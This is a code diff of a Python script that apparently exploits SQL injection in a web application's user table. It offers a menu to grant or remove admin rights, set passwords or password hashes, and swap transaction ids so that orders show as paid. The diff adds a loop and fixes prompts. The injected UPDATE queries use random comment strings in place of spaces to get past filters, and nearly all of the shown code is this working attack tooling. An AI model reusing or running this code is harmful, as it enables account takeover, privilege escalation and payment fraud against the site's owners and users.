@@ -23,19 +23,22 @@ rand_string_pattern = re.compile(r"/\*.{6}\*/")
 
 
 def main():
-    task = input("what would you like to do:\n[1]=> make admin\n[2]=> swap txnid and set paid\n[3]=> remove admin\n[4]=> change password\n[5]=> change hash%s"%(shell_char))
-    if task == "1":
-        make_admin()
-    elif task == "2":
-        swap_txn_id()
-    elif task == "3":
-        remove_admin()
-    elif task == "4":
-        change_password()
-    elif task == "5":
-        change_hash()
-    else:
-        print("Invalid input!...please check your input...")
+    while True:
+        task = input("what would you like to do:\n[1]=> make admin\n[2]=> swap txnid and set paid\n[3]=> remove admin\n[4]=> change password\n[5]=> change hash\n[6]=> Exit%s"%(shell_char))
+        if task == "1":
+            make_admin()
+        elif task == "2":
+            swap_txn_id()
+        elif task == "3":
+            remove_admin()
+        elif task == "4":
+            change_password()
+        elif task == "5":
+            change_hash()
+        elif task == "6":
+            break
+        else:
+            print("Invalid input!...please check your input...")
 
 
 def make_admin():
@@ -77,21 +80,21 @@ def swap_txn_id():
 
 
 def remove_admin():
-    username = input("\nEnter username to make admin%s"%(shell_char))
+    username = input("\nEnter username%s"%(shell_char))
     remove_admin_query = "UPDATE tblusers SET enable='n', usergroupid='4' where username='{}'".replace(' ', get_rand_string()).format(username)
     if queryDB(remove_admin_query):
         print("{} was removed from admin....".format(username))
 
 
 def change_password():
-    username = input("\nEnter username to make admin%s"%(shell_char))
+    username = input("\nEnter username%s"%(shell_char))
     password = input("\nEnter the new password you want to set%s"%(shell_char))
     make_admin_query = "UPDATE tblusers SET pwd=password('{}') where username='{}'".replace(' ', get_rand_string()).format(password, username)
     if queryDB(make_admin_query):
         print("print password was successfully set to {}".format(password))
 
 def change_hash():
-    username = input("\nEnter username to make admin%s"%(shell_char))
+    username = input("\nEnter username%s"%(shell_char))
     password_hash = input("\nEnter the new password hash you want to set%s"%(shell_char))
     make_admin_query = "UPDATE tblusers SET pwd={} where username='{}'".replace(' ', get_rand_string()).format(password_hash, username)
     if queryDB(make_admin_query):
